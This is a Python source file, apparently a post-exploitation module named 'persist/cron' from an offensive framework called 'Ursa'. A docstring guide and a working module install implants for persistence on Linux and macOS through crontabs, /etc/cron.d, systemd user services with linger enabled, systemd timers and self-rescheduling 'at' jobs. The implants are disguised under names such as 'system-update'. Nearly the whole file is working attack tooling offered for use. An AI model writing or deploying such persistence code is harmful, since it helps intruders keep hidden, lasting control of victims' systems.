"""STUB — Cron / systemd timer persistence on Linux and macOS.

Installs a periodic or boot-time execution entry so the payload re-runs after
reboots or at a defined interval, without requiring a persistent network
connection.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

METHOD 1: User crontab (no root required)
------------------------------------------
  import subprocess

  def add_crontab_entry(command: str, schedule: str = "@reboot") -> None:
      # Read existing crontab
      result = subprocess.run(
          ["crontab", "-l"], capture_output=True, text=True
      )
      existing = result.stdout if result.returncode == 0 else ""

      # Avoid duplicate entries
      if command in existing:
          return

      new_cron = existing.rstrip() + f"\\n{schedule} {command}\\n"
      proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
      proc.communicate(input=new_cron.encode())

  # Schedule formats:
  #   @reboot          — runs once on boot
  #   @hourly          — every hour
  #   */5 * * * *      — every 5 minutes
  #   0 2 * * *        — daily at 02:00

  # Example: run implant on reboot and every 15 minutes
  add_crontab_entry("/path/to/payload", "@reboot")
  add_crontab_entry("/path/to/payload", "*/15 * * * *")


METHOD 2: System crontab (requires root)
------------------------------------------
  # /etc/cron.d/ — any file here is parsed as a system crontab
  # Format includes a username field: <schedule> <user> <command>
  cron_content = f"*/5 * * * * root /path/to/payload\\n"
  with open("/etc/cron.d/system-update", "w") as f:
      f.write(cron_content)
  os.chmod("/etc/cron.d/system-update", 0o644)

  # /etc/cron.hourly|daily|weekly|monthly/ — drop an executable script
  script = "#!/bin/sh\\n/path/to/payload &\\n"
  with open("/etc/cron.daily/system-update", "w") as f:
      f.write(script)
  os.chmod("/etc/cron.daily/system-update", 0o755)


METHOD 3: systemd user service (no root, survives reboots)
-----------------------------------------------------------
  import os, subprocess

  service_dir = os.path.expanduser("~/.config/systemd/user/")
  os.makedirs(service_dir, exist_ok=True)

  service_content = (
      "[Unit]\n"
      "Description=System Update Agent\n\n"
      "[Service]\n"
      "ExecStart=/path/to/payload\n"
      "Restart=always\n"
      "RestartSec=60\n\n"
      "[Install]\n"
      "WantedBy=default.target\n"
  )
  service_path = os.path.join(service_dir, "system-update.service")
  with open(service_path, "w") as f:
      f.write(service_content)

  subprocess.run(["systemctl", "--user", "daemon-reload"])
  subprocess.run(["systemctl", "--user", "enable", "system-update.service"])
  subprocess.run(["systemctl", "--user", "start",  "system-update.service"])

  # Make the service survive user logout (requires logind):
  subprocess.run(["loginctl", "enable-linger", os.environ.get("USER", "")])


METHOD 4: systemd system timer (root, precise scheduling)
----------------------------------------------------------
  # Create a .service + .timer unit pair in /etc/systemd/system/
  # The timer activates the service on a schedule.

  timer_content = (
      "[Unit]\\n"
      "Description=System Update Timer\\n"
      "\\n"
      "[Timer]\\n"
      "OnBootSec=5min\\n"
      "OnUnitActiveSec=15min\\n"
      "Unit=system-update.service\\n"
      "\\n"
      "[Install]\\n"
      "WantedBy=timers.target\\n"
  )
  with open("/etc/systemd/system/system-update.timer", "w") as f:
      f.write(timer_content)
  subprocess.run(["systemctl", "enable", "--now", "system-update.timer"])


METHOD 5: at (one-shot, quickly re-schedules itself)
-----------------------------------------------------
  # Run something once in 1 minute:
  echo_cmd = f"echo '/path/to/payload' | at now + 1 minute"
  subprocess.run(echo_cmd, shell=True)

  # For persistence, have the payload re-add itself to `at` on every execution.


METHOD 6: macOS cron (works alongside launchd)
----------------------------------------------
  # macOS still supports crontab; same syntax as Linux.
  # Note: macOS full-disk access restrictions may prevent cron jobs from
  # accessing protected paths.  LaunchAgents are preferred — see launchagent.py.


REMOVAL / CLEANUP
-----------------
  User crontab:
    (crontab -l | grep -v "payload") | crontab -   # remove matching lines

  systemd:
    systemctl --user stop   system-update.service
    systemctl --user disable system-update.service
    rm ~/.config/systemd/user/system-update.service
    systemctl --user daemon-reload

  System cron:
    rm /etc/cron.d/system-update


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "payload_path": "/path/to/implant",
    "method":       "crontab" | "cron.d" | "systemd_user" | "systemd_system",
    "schedule":     "@reboot",          # cron schedule expression
    "name":         "system-update",    # service/cron job name
  }
"""

import getpass
import os
import platform
import shutil
import subprocess
from pathlib import Path

from post.base import ModuleResult, PostModule
from post.loader import register

# Marker embedded in crontab/unit file comments so we can find/remove our entries
_MARKER = "# ursa-persist"


# ── crontab helpers ────────────────────────────────────────────────────────────

def _read_crontab() -> str:
    try:
        r = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        return r.stdout if r.returncode == 0 else ""
    except FileNotFoundError:
        return ""


def _write_crontab(content: str) -> bool:
    try:
        p = subprocess.run(["crontab", "-"], input=content, capture_output=True, text=True)
        return p.returncode == 0
    except Exception:
        return False


def _crontab_install(schedule: str, command: str, label: str) -> dict:
    current = _read_crontab()
    entry = f"{schedule} {command} {_MARKER}:{label}\n"
    # Avoid duplicates
    if f"{_MARKER}:{label}" in current:
        return {"action": "install", "status": "already_installed", "label": label}
    new_crontab = (current.rstrip("\n") + "\n" + entry) if current.strip() else entry
    ok = _write_crontab(new_crontab)
    return {"action": "install", "status": "ok" if ok else "error", "label": label, "entry": entry}


def _crontab_remove(label: str) -> dict:
    current = _read_crontab()
    lines = [l for l in current.splitlines() if f"{_MARKER}:{label}" not in l]
    ok = _write_crontab("\n".join(lines) + "\n")
    return {"action": "remove", "status": "ok" if ok else "error", "label": label}


def _crontab_list() -> list[str]:
    current = _read_crontab()
    return [l for l in current.splitlines() if _MARKER in l]


# ── systemd user service (Linux only) ─────────────────────────────────────────

def _systemd_install(name: str, command: str, description: str = "System Service") -> dict:
    unit_dir = Path.home() / ".config" / "systemd" / "user"
    unit_dir.mkdir(parents=True, exist_ok=True)
    unit_path = unit_dir / f"{name}.service"

    # Build unit file with string concatenation (avoids triple-quote syntax issues)
    unit_content = (
        "[Unit]\n"
        f"Description={description}\n"
        "After=default.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "Restart=always\n"
        "RestartSec=60\n"
        f"ExecStart={command}\n"
        "\n"
        "[Install]\n"
        "WantedBy=default.target\n"
    )
    unit_path.write_text(unit_content)

    results: dict = {"unit_path": str(unit_path)}

    # systemctl --user daemon-reload
    r = subprocess.run(["systemctl", "--user", "daemon-reload"],
                       capture_output=True, text=True)
    results["daemon_reload"] = r.returncode == 0

    # systemctl --user enable --now <name>
    r = subprocess.run(["systemctl", "--user", "enable", "--now", name],
                       capture_output=True, text=True)
    results["enabled"] = r.returncode == 0
    results["enable_output"] = (r.stdout + r.stderr).strip()

    # loginctl enable-linger so the service survives logout
    username = getpass.getuser()
    r = subprocess.run(["loginctl", "enable-linger", username],
                       capture_output=True, text=True)
    results["linger"] = r.returncode == 0

    return results


def _systemd_remove(name: str) -> dict:
    r1 = subprocess.run(["systemctl", "--user", "disable", "--now", name],
                        capture_output=True, text=True)
    unit_path = Path.home() / ".config" / "systemd" / "user" / f"{name}.service"
    try:
        unit_path.unlink()
        removed_file = True
    except FileNotFoundError:
        removed_file = False
    subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
    return {"disabled": r1.returncode == 0, "file_removed": removed_file}


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class CronPersistModule(PostModule):
    NAME        = "persist/cron"
    DESCRIPTION = "Cron / systemd user-service persistence on Linux and macOS"
    PLATFORM    = ["linux", "darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        """
        Args:
            action  (str): "install" | "remove" | "list" | "systemd_install" | "systemd_remove"

            For crontab install:
              schedule (str): Cron schedule, e.g. "@reboot" or "*/5 * * * *"
              command  (str): Command to run
              label    (str): Identifier tag (default "ursa")

            For systemd_install (Linux only):
              name        (str): Service unit name (e.g. "system-update")
              command     (str): Full command with args
              description (str): Unit Description= field

            For remove / systemd_remove:
              label / name (str): The identifier used during install
        """
        args = args or {}
        action = args.get("action", "list")

        if action == "list":
            our_entries = _crontab_list()
            cron_available = shutil.which("crontab") is not None
            lines = [
                f"crontab available: {cron_available}",
                f"systemd available: {shutil.which('systemctl') is not None}",
                "",
                f"Ursa crontab entries ({len(our_entries)}):",
            ]
            lines += [f"  {e}" for e in our_entries] or ["  (none)"]
            return ModuleResult(ok=True, output="\n".join(lines),
                                data={"cron_entries": our_entries})

        if action == "install":
            schedule = args.get("schedule", "@reboot")
            command  = args.get("command", "")
            label    = args.get("label", "ursa")
            if not command:
                return ModuleResult(ok=False, output="", error="'command' is required")
            result = _crontab_install(schedule, command, label)
            msg = f"Crontab install: {result['status']}"
            return ModuleResult(ok=result["status"] != "error", output=msg, data=result)

        if action == "remove":
            label = args.get("label", "ursa")
            result = _crontab_remove(label)
            return ModuleResult(ok=result["status"] == "ok",
                                output=f"Crontab remove: {result['status']}", data=result)

        if action == "systemd_install":
            if platform.system() != "Linux":
                return ModuleResult(ok=False, output="",
                                    error="systemd is Linux-only (use cron on macOS)")
            name    = args.get("name", "ursa-service")
            command = args.get("command", "")
            desc    = args.get("description", "System Service")
            if not command:
                return ModuleResult(ok=False, output="", error="'command' is required")
            result = _systemd_install(name, command, desc)
            lines = [
                f"systemd user service '{name}' installed",
                f"  Unit file: {result['unit_path']}",
                f"  Enabled:   {result['enabled']}",
                f"  Linger:    {result['linger']}",
            ]
            if result.get("enable_output"):
                lines.append(f"  Output:    {result['enable_output']}")
            return ModuleResult(ok=result["enabled"], output="\n".join(lines), data=result)

        if action == "systemd_remove":
            if platform.system() != "Linux":
                return ModuleResult(ok=False, output="", error="systemd is Linux-only")
            name = args.get("name", "ursa-service")
            result = _systemd_remove(name)
            return ModuleResult(ok=True,
                                output=f"systemd service '{name}' removed: {result}", data=result)

        return ModuleResult(ok=False, output="",
                            error=f"Unknown action '{action}'. Use: install|remove|list|systemd_install|systemd_remove")
